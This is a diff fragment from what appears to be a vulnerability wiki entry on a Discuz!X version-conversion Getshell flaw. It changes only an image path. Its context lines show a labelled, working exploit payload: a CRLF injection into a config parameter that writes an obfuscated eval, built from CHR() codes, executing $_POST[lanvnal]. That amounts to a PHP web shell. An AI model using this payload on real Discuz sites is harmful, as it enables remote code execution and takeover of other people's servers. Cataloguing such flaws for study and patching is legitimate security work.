@@ -116,7 +116,7 @@ payload：
 
     a=config&source=d7.2_x1.5&submit=yes&newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(108).CHR(97).CHR(110).CHR(118).CHR(110).CHR(97).CHR(108).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=aaaa
 
-![](/Users/aresx/Documents/VulWiki/.resource/Discuz!X系列全版本版本转换功能导致Getshell/media/rId26.png)
+![](./.resource/Discuz!X系列全版本版本转换功能导致Getshell/media/rId26.png)
 
 参考链接
 --------
